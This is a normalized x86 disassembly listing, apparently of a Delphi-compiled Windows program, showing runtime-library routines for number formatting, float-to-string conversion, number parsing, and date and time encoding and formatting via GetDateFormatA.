cmp cl 0x46
je r-xdata
jmp r-xdata
mov ecx 0xa
cmp bl 0x55
je sub_408000
mov ecx [ ebp - 0x24 ]
retn
retn
dec edi
mov eax 0x12
mov edx [ ebp - 0x24 ]
cmp edx eax
jbe r-xdata
mov bl 0x3
cmp cl 0x4e
je r-xdata
jmp r-xdata
mov edx 0x2
cmp cl 0x4d
jne r-xdata
cmp cl 0x4d
jne r-xdata
movzx edx [ rw-data ]
jmp r-xdata
mov bl 0x4
sub_408d3c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
test esi esi
je r-xdata
mov eax esi
call sub_4086f4
push eax
push edi
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov eax ebx
mov edx 0x7fffffff
call sub_4089c4
mov [ ebx + eax ] 0x0
mov eax ebx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_408d7c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
test esi esi
je r-xdata
mov eax esi
call sub_4086f4
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov eax ebx
mov edx edi
call sub_4089c4
mov [ ebx + eax ] 0x0
mov eax ebx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_408dd0
push ebp
mov ebp esp
add esp 0xfffff004
push eax
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov ebx 0x1000
mov eax [ ebp - 0x4 ]
call sub_404334
cmp eax 0xc00
jge r-xdata
mov eax [ ebp - 0x4 ]
call sub_404334
mov ebx eax
mov eax ebx
mov eax [ ebp - 0x4 ]
call sub_404334
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
lea eax [ ebp - 0x1008 ]
mov edx 0xfff
call sub_4089c4
jmp r-xdata
lea edx [ ebp - 0x1008 ]
mov ecx esi
xchg ecx eax
call sub_404164
jmp r-xdata
mov edx ebx
dec edx
cmp eax edx
jl r-xdata
mov edx ebx
dec edx
cmp eax edx
jge r-xdata
add ebx ebx
mov eax esi
call sub_404074
mov eax esi
mov edx ebx
call sub_4046c0
mov eax [ ebp - 0x4 ]
call sub_404334
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx ebx
dec edx
mov eax [ esi ]
call sub_4089c4
mov edx esi
xchg edx eax
call sub_4046c0
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_408e90
push esi
xor esi esi
stosb [ edi ]
or bl bl
jne r-xdata
or edx edx
jge r-xdata
xor edx edx
jmp r-xdata
or ah ah
je r-xdata
mov al 0x2d
neg edx
jmp r-xdata
xchg edx eax
push eax
mov ebx esp
mov al ah
stosb [ edi ]
xor edx edx
div [ esi + rw-data ]
add dl 0x30
mov [ ebx ] dl
inc ebx
dec ecx
or eax eax
jne r-xdata
or ecx ecx
jg r-xdata
dec ebx
mov al [ ebx ]
stosb [ edi ]
cmp ebx esp
jne r-xdata
pop eax
pop esi
retn
sub_408ed4
push ebp
mov ebp esp
add esp 0xffffffd4
push edi
push esi
push ebx
mov [ ebp - 0x4 ] eax
mov al [ rw-data ]
mov [ ebp - 0x5 ] al
mov al [ rw-data ]
mov [ ebp - 0x6 ] al
mov eax [ rw-data ]
mov [ ebp - 0xc ] eax
mov al [ rw-data ]
mov [ ebp - 0xd ] al
mov al [ rw-data ]
mov [ ebp - 0xe ] al
mov [ ebp - 0x14 ] 0x0
mov eax 0x13
cmp cl 0x0
jne r-xdata
mov [ ebp + 0xc ] eax
push eax
mov eax 0x270f
cmp [ ebp + 0x10 ] 0x2
jb r-xdata
mov eax [ ebp + 0xc ]
cmp eax 0x2
jge r-xdata
push eax
lea eax [ ebp - 0x2c ]
call sub_4091a8
mov edi [ ebp - 0x4 ]
movzx eax [ ebp - 0x2c ]
sub eax 0x7fff
cmp eax 0x2
jae r-xdata
mov eax [ ebp + 0x8 ]
cmp eax 0x12
jle r-xdata
mov eax 0x2
lea esi [ ebp - 0x29 ]
movzx ebx [ ebp + 0x10 ]
cmp bl 0x1
je r-xdata
mov ecx eax
call sub_408fd3
lea esi [ ecx + ecx * 2 + r-xdata ]
add esi [ ebp - 0x14 ]
mov ecx 0x3
[ edi ] [ esi ]
jmp r-xdata
mov eax 0x12
lea ebx [ ebx * 4 + r-xdata ]
add ebx [ ebp - 0x14 ]
mov ebx [ ebx ]
add ebx [ ebp - 0x14 ]
call ebx
cmp bl 0x4
ja r-xdata
mov eax edi
sub eax [ ebp - 0x4 ]
pop ebx
pop esi
pop edi
jmp r-xdata
mov esp ebp
pop ebp
retn 0xc
mov bl 0x0
movsx eax [ ebp - 0x2c ]
cmp eax [ ebp + 0xc ]
jle r-xdata
sub_408fdd
call sub_408fd3
movsx ecx [ ebp - 0x2c ]
xor edx edx
cmp ecx [ ebp + 0xc ]
jg r-xdata
mov ecx 0x1
inc edx
cmp ecx 0xfffffffd
jl r-xdata
mov al 0x30
[ edi ]
stosb [ edi ]
loop r-xdata
or ecx ecx
jg r-xdata
retn
xor eax eax
jmp r-xdata
lodsb [ esi ]
or al al
je r-xdata
lodsb [ esi ]
or al al
je r-xdata
mov al 0x30
stosb [ edi ]
cmp [ esi ] 0x0
je r-xdata
mov ecx [ ebp + 0x8 ]
cmp ecx 0x4
jbe r-xdata
or edx edx
je r-xdata
mov ah al
mov al [ ebp - 0x5 ]
stosw [ edi ]
mov al [ ebp - 0x5 ]
stosb [ edi ]
neg ecx
mov al 0x30
[ edi ]
jmp r-xdata
mov al 0x45
mov bl [ ebp - 0x29 ]
movsx edx [ ebp - 0x2c ]
dec edx
call sub_408e90
retn
xor ecx ecx
stosb [ edi ]
jmp r-xdata
lodsb [ esi ]
or al al
je r-xdata
sub_409039
call sub_408fd3
call sub_408fca
mov ah [ ebp - 0x5 ]
stosw [ edi ]
mov ecx [ ebp + 0xc ]
dec ecx
call sub_408fca
stosb [ edi ]
loop r-xdata
mov ah 0x2b
mov ecx [ ebp + 0x8 ]
cmp ecx 0x4
jbe r-xdata
mov al 0x45
mov bl [ ebp - 0x29 ]
movsx edx [ ebp - 0x2c ]
dec edx
call sub_408e90
retn
xor ecx ecx
sub_409075
mov edx [ ebp + 0x8 ]
cmp edx 0x12
jb r-xdata
movsx ecx [ ebp - 0x2c ]
or ecx ecx
jg r-xdata
mov edx 0x12
xor ebx ebx
cmp [ ebp + 0x10 ] 0x2
je r-xdata
mov al 0x30
stosb [ edi ]
jmp r-xdata
call sub_408fca
stosb [ edi ]
dec ecx
je r-xdata
mov eax ecx
dec eax
mov bl 0x3
div bl
mov bl ah
inc ebx
or edx edx
je r-xdata
dec ebx
jne r-xdata
retn
mov al [ ebp - 0x5 ]
test al al
je r-xdata
mov al [ ebp - 0x6 ]
test al al
je r-xdata
jecxz r-xdata
stosb [ edi ]
stosb [ edi ]
mov bl 0x3
jmp r-xdata
call sub_408fca
stosb [ edi ]
dec edx
jne r-xdata
mov al 0x30
inc ecx
jne r-xdata
stosb [ edi ]
dec edx
je r-xdata
sub_4090da
xor ebx ebx
mov bl [ ebp - 0xd ]
mov ecx 0x3
cmp [ ebp - 0x2a ] 0x0
je r-xdata
cmp bl cl
jbe r-xdata
mov bl [ ebp - 0xe ]
mov ecx 0x40f
add bl ch
lea ebx [ ebx + ebx * 4 + r-xdata ]
add ebx [ ebp - 0x14 ]
mov ecx 0x5
mov bl cl
retn
push ecx
push ebx
cmp al 0x24
je r-xdata
call sub_40912e
jmp r-xdata
cmp al 0x2a
je r-xdata
pop ebx
pop ecx
inc ebx
loop r-xdata
call sub_409075
stosb [ edi ]
jmp r-xdata
mov al [ ebx ]
cmp al 0x40
je r-xdata
sub_4091a8
push ebp
mov ebp esp
add esp 0xffffffe0
push edi
push esi
push ebx
mov ebx eax
mov esi edx
mov [ ebp - 0x4 ] 0x0
cmp cl 0x0
je r-xdata
call sub_4091d5
jmp r-xdata
call sub_4092f7
jmp r-xdata
pop ebx
pop esi
pop edi
mov esp ebp
pop ebp
retn 0x8
sub_4091d5
mov ax [ esi + 0x8 ]
mov edx eax
and eax 0x7fff
je r-xdata
xor edx edx
cmp eax 0x7fff
jne r-xdata
shr dx 0xf
mov [ ebx ] ax
mov [ ebx + 0x2 ] dl
retn
fld [ esi ]
sub eax 0x3fff
imul eax eax 0x4d10
sar eax 0x10
inc eax
mov [ ebp - 0x8 ] eax
mov eax 0x12
sub eax [ ebp - 0x8 ]
fabs
push ebx
mov ebx [ ebp - 0x4 ]
call j_sub_402dfc
pop ebx
frndint
mov edi [ ebp - 0x4 ]
fld [ edi + rw-data ]
fcomp st1
fwait
fnstsw [ ebp - 0xa ]
fwait
test [ ebp - 0xa ] 0x4100
je r-xdata
test [ esi + 0x6 ] 0x8000
je r-xdata
fbstp [ ebp - 0x18 ]
lea edi [ ebx + 0x3 ]
mov edx 0x9
fwait
fidiv [ edi + rw-data ]
inc [ ebp - 0x8 ]
mov [ ebx + 0x3 ] 0x0
jmp r-xdata
cmp [ esi ] 0x0
jne r-xdata
mov al [ edx + ebp - 0x19 ]
mov ah al
shr al 0x4
and ah 0xf
add ax 0x3030
stosw [ edi ]
dec edx
jne r-xdata
xor al al
stosb [ edi ]
mov edi [ ebp - 0x8 ]
add edi [ ebp + 0x8 ]
jns r-xdata
inc eax
cmp [ esi + 0x4 ] 0x80000000
je r-xdata
cmp edi [ ebp + 0xc ]
jb r-xdata
xor eax eax
jmp r-xdata
cmp edi 0x12
jae r-xdata
mov edi [ ebp + 0xc ]
mov edi 0x12
cmp [ ebx + edi + 0x3 ] 0x35
jb r-xdata
xor edx edx
jmp r-xdata
cmp [ ebx + edi + 0x3 ] 0x30
je r-xdata
mov [ ebx + edi + 0x3 ] 0x0
dec edi
js r-xdata
mov [ ebx + edi + 0x3 ] 0x0
dec edi
js r-xdata
mov eax [ ebp - 0x8 ]
mov dx [ esi + 0x8 ]
mov [ ebx + 0x3 ] 0x31
inc [ ebp - 0x8 ]
jmp r-xdata
inc [ ebx + edi + 0x3 ]
cmp [ ebx + edi + 0x3 ] 0x39
ja r-xdata
jmp r-xdata
sub_4092f7
mov eax [ esi ]
mov edx [ esi + 0x4 ]
mov ecx eax
or ecx edx
je r-xdata
xor eax eax
xor edx edx
mov [ ebx + 0x3 ] al
or edx edx
jns r-xdata
xor ecx ecx
mov edi [ ebp + 0x8 ]
or edi edi
jge r-xdata
neg edx
neg eax
sbb edx 0x0
cmp edi 0x4
jl r-xdata
xor edi edi
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] edx
fild [ ebp - 0x20 ]
mov edx edi
mov eax 0x4
sub eax edx
je r-xdata
mov edi 0x4
fbstp [ ebp - 0x18 ]
lea edi [ ebx + 0x3 ]
fwait
or ecx ecx
jne r-xdata
mov edi [ ebp - 0x4 ]
fidiv [ edi + eax * 4 + r-xdata ]
inc ecx
sub eax 0xa7640000
sbb edx 0xde0b6b3
jae r-xdata
dec ecx
add eax 0xa7640000
adc edx 0xde0b6b3
mov al cl
add al 0x30
stosb [ edi ]
mov ecx 0x9
mov ecx 0x9
mov al [ ecx + ebp - 0x19 ]
mov ah al
shr al 0x4
mov eax edi
lea ecx [ ebx + edx + 0x3 ]
sub eax ecx
add al 0x30
stosb [ edi ]
mov al ah
and al 0xf
mov al ah
and al 0xf
jne r-xdata
mov [ edi ] 0x0
dec edi
cmp [ edi ] 0x30
je r-xdata
mov edx [ esi + 0x4 ]
shr edx 0x1f
jmp r-xdata
add al 0x30
stosb [ edi ]
dec ecx
jne r-xdata
dec ecx
jne r-xdata
mov [ ebx ] ax
mov [ ebx + 0x2 ] dl
retn
mov al [ ecx + ebp - 0x19 ]
mov ah al
shr al 0x4
jne r-xdata
jmp r-xdata
sub_4093d4
push ebp
mov ebp esp
add esp 0xfffffff4
push edi
push esi
push ebx
mov esi eax
mov edi edx
mov [ ebp - 0x4 ] 0x0
mov al [ rw-data ]
mov [ ebp - 0x5 ] al
mov ebx ecx
fwait
fnstcw [ ebp - 0x8 ]
fwait
fnclex
fldcw [ rw-data ]
fldz
call sub_40948b
mov bh [ esi ]
cmp bh 0x2b
je r-xdata
inc esi
cmp bh 0x2d
jne r-xdata
cmp ecx esi
je r-xdata
inc esi
call sub_409496
neg edx
mov ecx esi
call sub_409496
xor edx edx
mov al [ esi ]
cmp al [ ebp - 0x5 ]
jne r-xdata
fstp st0
mov al [ esi ]
and al 0xdf
cmp al 0x45
jne r-xdata
pop ebx
pop esi
pop edi
mov esp ebp
pop ebp
retn
call sub_40948b
cmp [ esi ] 0x0
jne r-xdata
inc esi
push edx
call sub_4094b2
pop eax
add edx eax
mov eax edx
cmp bl 0x1
jne r-xdata
push ebx
mov ebx [ ebp - 0x4 ]
call j_sub_402dfc
pop ebx
cmp bh 0x2d
jne r-xdata
add eax 0x4
cmp bl 0x0
je r-xdata
fchs
fstp [ edi ]
fistp [ edi ]
jmp r-xdata
xor eax eax
mov al 0x1
jmp r-xdata
fwait
fnstsw ax
test ax 0x9
jne r-xdata
fwait
fnclex
fldcw [ ebp - 0x8 ]
fwait
jmp r-xdata
sub_409496
xor eax eax
xor edx edx
dec esi
retn
fimul [ rw-data ]
mov [ ebp - 0xc ] eax
fiadd [ ebp - 0xc ]
inc edx
jmp r-xdata
lodsb [ esi ]
sub al 0x3a
add al 0xa
jae r-xdata
sub_4094b2
xor eax eax
xor edx edx
mov cl [ esi ]
cmp cl 0x2b
je r-xdata
inc esi
cmp cl 0x2d
jne r-xdata
cmp cl 0x2d
jne r-xdata
inc esi
imul edx edx 0xa
add edx eax
cmp edx 0x1f4
jb r-xdata
mov al [ esi ]
sub al 0x3a
add al 0xa
jae r-xdata
retn
neg edx
sub_4094e8
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
mov ebx eax
push 0x0
push 0xf
push 0x0
lea edx [ ebp + 0x8 ]
lea eax [ ebp - 0x40 ]
xor ecx ecx
call sub_408ed4
mov ecx eax
lea edx [ ebp - 0x40 ]
mov eax ebx
call sub_404164
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_409518
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
mov ebx eax
push 0x0
push 0x0
push 0x0
lea edx [ ebp + 0x8 ]
lea eax [ ebp - 0x40 ]
mov cl 0x1
call sub_408ed4
mov ecx eax
lea edx [ ebp - 0x40 ]
mov eax ebx
call sub_404164
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_409564
push ebx
push esi
add esp 0xfffffff4
mov esi edx
mov ebx eax
mov eax ebx
call sub_404534
mov edx esp
xor ecx ecx
call sub_4093d4
test al al
je r-xdata
add esp 0xc
pop esi
pop ebx
retn
fld [ esp ]
fstp [ esi ]
fwait
sub_409590
push ebx
push esi
add esp 0xfffffff4
mov esi edx
mov ebx eax
mov eax ebx
call sub_404534
mov edx esp
xor ecx ecx
call sub_4093d4
test al al
je r-xdata
add esp 0xc
pop esi
pop ebx
retn
fld [ esp ]
fstp [ esi ]
fwait
sub_4095d8
push ebp
mov ebp esp
push ebx
xor ebx ebx
mov ecx eax
fld [ ebp + 0x8 ]
fmul [ ebx + rw-data ]
sub esp 0x8
fistp [ esp ]
fwait
pop eax
pop edx
or edx edx
jns r-xdata
div [ ebx + rw-data ]
neg edx
neg eax
sbb edx 0x0
div [ ebx + rw-data ]
neg eax
jmp r-xdata
add eax 0xa955a
mov [ ecx ] edx
mov [ ecx + 0x4 ] eax
pop ebx
pop ebp
retn 0x8
sub_40961c
push ebp
mov ebp esp
add esp 0xfffffff8
push esi
mov esi [ ebp + 0xc ]
mov [ ebp - 0x1 ] 0x0
cmp ax 0x18
jae r-xdata
mov al [ ebp - 0x1 ]
pop esi
pop ecx
pop ecx
pop ebp
retn 0x8
cmp dx 0x3c
jae r-xdata
cmp cx 0x3c
jae r-xdata
cmp si 0x3e8
jae r-xdata
movzx eax ax
imul eax eax 0x36ee80
movzx edx dx
imul edx edx 0xea60
add eax edx
movzx edx cx
imul edx edx 0x3e8
add eax edx
movzx edx si
add eax edx
mov [ ebp - 0x8 ] eax
fild [ ebp - 0x8 ]
fdiv [ r-xdata ]
mov eax [ ebp + 0x8 ]
fstp [ eax ]
fwait
mov [ ebp - 0x1 ] 0x1
sub_40968c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
lea eax [ ebp - 0xc ]
call sub_4095d8
mov eax [ ebp - 0xc ]
lea ecx [ ebp - 0x2 ]
mov dx 0xea60
call sub_407c38
push esi
mov ecx ebx
movzx eax [ ebp - 0x2 ]
mov dx 0x3c
call sub_407c38
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
movzx eax [ ebp - 0x4 ]
mov dx 0x3e8
call sub_407c38
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_4096e8
push ebx
push esi
mov ecx eax
movzx eax cx
and eax 0x3
test eax eax
jne r-xdata
xor eax eax
pop esi
pop ebx
retn
movzx ebx cx
mov eax ebx
mov esi 0x64
xor edx edx
div esi
test edx edx
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax ebx
mov ecx 0x190
xor edx edx
div ecx
test edx edx
je r-xdata
sub_409724
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov [ ebp - 0x2 ] ax
mov [ ebp - 0x3 ] 0x0
mov ax [ ebp - 0x2 ]
call sub_4096e8
and eax 0x7f
lea eax [ eax + eax * 2 ]
lea esi [ eax * 8 + rw-data ]
cmp [ ebp - 0x2 ] 0x1
jb r-xdata
mov al [ ebp - 0x3 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
cmp [ ebp - 0x2 ] 0x270f
ja r-xdata
cmp di 0x1
jb r-xdata
cmp di 0xc
ja r-xdata
cmp bx 0x1
jb r-xdata
movzx eax di
cmp bx [ esi + eax * 2 - 0x2 ]
ja r-xdata
movzx eax di
dec eax
test eax eax
jle r-xdata
movzx ecx [ ebp - 0x2 ]
dec ecx
mov eax ecx
mov esi 0x64
cdq
idiv esi
imul esi ecx 0x16d
mov edx ecx
test edx edx
jns r-xdata
mov ecx 0x1
sar edx 0x2
add esi edx
sub esi eax
mov eax ecx
mov ecx 0x190
cdq
idiv ecx
add esi eax
movzx eax bx
add esi eax
sub esi 0xa955a
mov [ ebp - 0x8 ] esi
fild [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
fstp [ eax ]
fwait
mov [ ebp - 0x3 ] 0x1
add edx 0x3
add bx [ esi + ecx * 2 - 0x2 ]
inc ecx
dec eax
jne r-xdata
sub_4097ec
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
lea eax [ ebp - 0x18 ]
call sub_4095d8
mov ecx [ ebp - 0x14 ]
test ecx ecx
jg r-xdata
mov eax ecx
mov esi 0x7
cdq
idiv esi
inc edx
mov [ ebx ] dx
dec ecx
mov bx 0x1
cmp ecx 0x23ab1
jl r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax ] 0x0
mov eax [ ebp - 0x8 ]
mov [ eax ] 0x0
mov eax [ ebp - 0xc ]
mov [ eax ] 0x0
mov [ ebx ] 0x0
xor edx edx
jmp r-xdata
lea eax [ ebp - 0xe ]
push eax
lea eax [ ebp - 0x10 ]
mov dx 0x8eac
xchg ecx eax
call sub_407c38
cmp [ ebp - 0x10 ] 0x4
jne r-xdata
sub ecx 0x23ab1
add bx 0x190
cmp ecx 0x23ab1
jge r-xdata
mov eax edx
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
imul ax [ ebp - 0x10 ] 0x64
add bx ax
lea eax [ ebp - 0xe ]
push eax
lea ecx [ ebp - 0x10 ]
movzx eax [ ebp - 0xe ]
mov dx 0x5b5
call sub_407c38
mov ax [ ebp - 0x10 ]
shl eax 0x2
add bx ax
lea eax [ ebp - 0xe ]
push eax
lea ecx [ ebp - 0x10 ]
movzx eax [ ebp - 0xe ]
mov dx 0x16d
call sub_407c38
cmp [ ebp - 0x10 ] 0x4
jne r-xdata
dec [ ebp - 0x10 ]
add [ ebp - 0xe ] 0x8eac
add bx [ ebp - 0x10 ]
mov eax ebx
call sub_4096e8
mov edx eax
xor eax eax
mov al dl
lea eax [ eax + eax * 2 ]
lea esi [ eax * 8 + rw-data ]
mov ax 0x1
dec [ ebp - 0x10 ]
add [ ebp - 0xe ] 0x16d
mov ecx [ ebp - 0x4 ]
mov [ ecx ] bx
mov ecx [ ebp - 0x8 ]
mov [ ecx ] ax
mov ax [ ebp - 0xe ]
inc eax
mov ecx [ ebp - 0xc ]
mov [ ecx ] ax
mov cx [ ebp - 0x10 ]
sub [ ebp - 0xe ] cx
inc eax
jmp r-xdata
movzx ecx ax
mov cx [ esi + ecx * 2 - 0x2 ]
mov [ ebp - 0x10 ] cx
mov cx [ ebp - 0xe ]
cmp cx [ ebp - 0x10 ]
jb r-xdata
sub_409938
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x2 ]
push eax
mov eax esi
call sub_4097ec
pop esi
pop ecx
pop ebp
retn 0x8
sub_409958
push ebp
mov ebp esp
add esp 0xfffffff8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x8 ]
call sub_4095d8
mov eax [ ebp - 0x4 ]
mov ecx 0x7
cdq
idiv ecx
mov eax edx
inc eax
pop ecx
pop ecx
pop ebp
retn 0x8
sub_409994
push ebp
mov ebp esp
push ebx
mov ecx [ ebp + 0x8 ]
mov ebx 0x100
sub ebx [ ecx - 0x104 ]
cmp edx ebx
jge r-xdata
test ebx ebx
je r-xdata
mov ebx edx
mov eax [ ebp + 0x8 ]
add [ eax - 0x104 ] ebx
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x104 ]
mov ecx [ ebp + 0x8 ]
lea edx [ ecx + edx - 0x100 ]
mov ecx ebx
call sub_4028c8
sub_4099d8
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_404334
mov edx eax
mov eax ebx
call sub_409994
pop ecx
pop ebx
pop ebp
retn
sub_4099f8
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
push 0x4
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x1c ] 0x0
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] 0x0
lea eax [ ebp - 0x20 ]
push eax
push 0x1
mov ecx rw-data
lea eax [ ebp - 0x10 ]
mov edx 0x10
call sub_4089c4
mov edx eax
lea eax [ ebp - 0x10 ]
call sub_409994
pop ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_409a44
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
add eax 0xfffffffc
mov edx [ eax ]
jmp r-xdata
mov ecx [ eax ]
mov cl [ ecx ]
mov ebx [ ebp + 0x8 ]
cmp cl [ ebx - 0x5 ]
je r-xdata
inc [ eax ]
mov eax [ eax ]
sub eax edx
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0xc ] eax
pop ebx
pop ebp
retn
sub_409a70
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x13 ] 0x0
jne r-xdata
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x12 ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
add eax 0xfffffff2
call sub_409938
mov eax [ ebp + 0x8 ]
mov [ eax - 0x13 ] 0x1
sub_409aa8
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1d ] 0x0
jne r-xdata
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
add eax 0xffffffe4
push eax
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x1a ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
add eax 0xffffffea
call sub_40968c
mov eax [ ebp + 0x8 ]
mov [ eax - 0x1d ] 0x1
sub_409ae8
push ebp
mov ebp esp
add esp 0xfffffee8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x118 ] ecx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_409c36
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_404074
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0xe ]
mov [ ebp - 0x14 ] ax
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0x10 ]
mov [ ebp - 0x12 ] ax
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0x12 ]
mov [ ebp - 0xe ] ax
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_40410c
push 0x100
lea eax [ ebp - 0x114 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_404534
push eax
lea eax [ ebp - 0x14 ]
push eax
push 0x4
call GetThreadLocale
push eax
call GetDateFormatA
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_409c3d
lea eax [ ebp - 0x118 ]
call sub_404074
lea eax [ ebp - 0x4 ]
call sub_404074
retn
mov eax ebx
lea edx [ ebp - 0x114 ]
mov ecx 0x100
call sub_4042e4
dec esi
jne r-xdata
mov eax [ rw-data ]
sub eax 0x4
je r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
sub eax 0xd
jne r-xdata
mov eax [ ebx ]
call sub_404334
mov edx eax
mov eax [ ebx ]
call sub_40c02c
cmp eax 0x4
jne r-xdata
push ebx
mov eax [ ebx ]
mov edx 0x1
call sub_40c1a0
mov ecx eax
mov eax [ ebx ]
mov edx 0x1
call sub_404594
jmp r-xdata
mov eax [ ebx ]
mov edx 0x3
call sub_40c13c
mov esi eax
lea eax [ ebp - 0x114 ]
add esi eax
dec esi
lea eax [ ebp - 0x118 ]
mov edx esi
call sub_40426c
mov eax [ ebp - 0x118 ]
mov edx 0x2
call sub_40c1a0
mov ecx eax
mov eax ebx
mov edx esi
call sub_404164
sub_409c50
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_409d2e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_404074
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0xe ]
mov [ ebp - 0x14 ] ax
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0x10 ]
mov [ ebp - 0x12 ] ax
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0x12 ]
mov [ ebp - 0xe ] ax
cmp esi 0x2
jg r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_40410c
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_40410c
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_409d35
lea eax [ ebp - 0x4 ]
call sub_404074
retn
mov eax ebx
lea edx [ ebp - 0x114 ]
mov ecx 0x100
call sub_4042e4
dec esi
jne r-xdata
push 0x100
lea eax [ ebp - 0x114 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_404534
push eax
lea eax [ ebp - 0x14 ]
push eax
push 0x4
call GetThreadLocale
push eax
call GetDateFormatA
test eax eax
je r-xdata
mov eax [ ebx ]
cmp [ eax ] 0x30
jne r-xdata
push ebx
mov eax [ ebx ]
call sub_404334
mov ecx eax
dec ecx
mov eax [ ebx ]
mov edx 0x2
call sub_404594
sub_409d58
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
xor edx edx
mov [ ebp - 0x28 ] edx
mov [ ebp - 0x24 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_40a4d9
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40a4e0
lea eax [ ebp - 0x28 ]
mov edx 0x2
call sub_404098
retn
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x108 ] 0x2
jge r-xdata
mov eax [ ebp + 0x8 ]
inc [ eax - 0x108 ]
mov bl 0x20
mov [ ebp - 0x13 ] 0x0
mov [ ebp - 0x1d ] 0x0
mov [ ebp - 0x1e ] 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax ]
test al al
jne r-xdata
mov [ ebp - 0x5 ] al
mov al [ ebp - 0x5 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x108 ]
